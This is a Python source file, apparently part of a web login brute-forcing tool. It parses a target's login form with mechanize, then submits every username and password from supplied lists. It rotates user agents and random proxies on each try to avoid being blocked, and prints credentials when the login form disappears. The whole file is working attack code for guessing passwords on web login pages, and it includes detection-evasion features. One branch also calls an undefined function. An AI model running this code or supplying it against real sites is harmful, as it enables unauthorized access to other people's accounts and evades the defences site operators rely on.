### REWRITE httpbrute
## NO oop

import mechanize, sys
from core import utils, actions, tbrowser

def parseFormInfo(optionURL):
	######################################
	#	Test connect to URL
	#	Fetch login field
	#	TODO print ONLY ONE status message
	#
	#####################################


	try:
		process = tbrowser.startBrowser()
		user_agent = tbrowser.useragent()

		process.addheaders = [('User-Agent', user_agent)]
		
		process.open(optionURL)
		#utils.printf("Connected. Getting form information...", "good")
		
		formLoginID, formUserfield, formPasswdfield = tbrowser.getLoginForm(process.forms())
		#utils.printf("Found login form", "good")
		return formLoginID, formUserfield, formPasswdfield
	except TypeError as error:
		#utils.printf("Can not find login form", "bad")
		#sys.exit(1)
		utils.die("Can not find login form", error)

	except Exception as error:
		#utils.printf(error, "bad")
		utils.die("Checking connection error", error)

	finally:
		process.close()



def handle(optionURL, optionUserlist, optionPasslist, sizePasslist, setProxyList, setKeyFalse):
	############################################
	#	Old code logic:
	#		Create 1 browser object per password
	#	Current:
	#		Create 1 browser object per username
	#		Pick 1 user agent per password try
	#
	############################################

	#	Get login form field informations
	frmLoginID, frmUserfield, frmPassfield = parseFormInfo(optionURL)
	#	Get single Username in username list / file
	for tryUsername in optionUserlist:
		#	If tryUsername is file object, remove \n
		#	tryUsername = tryUsername[:-1]
		tryUsername = tryUsername.replace('\n', '')
		try:
			optionPasslist.seek(0)
		except:
			pass

		######	new test code block
		proc = tbrowser.startBrowser()
		# proc = mechanize.Browser()
		# proc.set_handle_robots(False)
		######

		idxTry = 0
		for tryPassword in optionPasslist:
			#	Get single Password, remove \n
			tryPassword = tryPassword.replace('\n', '')

			#	New test code block: add new user_agent each try
			user_agent = tbrowser.useragent()
			proc.addheaders = [('User-Agent', user_agent)]
			
			#print "Debug: %s:%s" %(tryUsername, tryPassword)
			
			
			if setProxyList:
				#Set proxy connect
				proxyAddr = actions.randomFromList(setProxyList)
				#utils.printf("Debug: proxy addr %s" %(proxyAddr))
				proc.set_proxies({"http": proxyAddr})

			proc.open(optionURL)
			#	End new code block

			try:
				idxTry += 1

				#	Select login form
				proc.select_form(nr = frmLoginID)
				proc.form[frmUserfield] = tryUsername
				proc.form[frmPassfield] = tryPassword

				#	Print status bar
				utils.printp(tryUsername, idxTry, sizePasslist)

				#	Send request
				proc.submit()

				#	Reload - useful for redirect to dashboard
				proc.reload()

				#	If no login form -> success
				#	TODO improve condition to use captcha
				if not tbrowser.getLoginForm(proc.forms()):

					#TODO edit mixed condition
					if setKeyFalse:
						if setKeyFalse not in proc.response().read():
							
							# Add creds to success list
							# If verbose: print
							
							printSuccess(tryUsername, tryPassword)

							#	Clear object and try new username
							proc.close()
							break
					else:
						utils.printSuccess(tryUsername, tryPassword)

						#	Clear object and try new username
						proc.close()
						break

			except mechanize.HTTPError as error:
				#	Get blocked
				utils.die("Thread has been blocked", error)

		proc.close()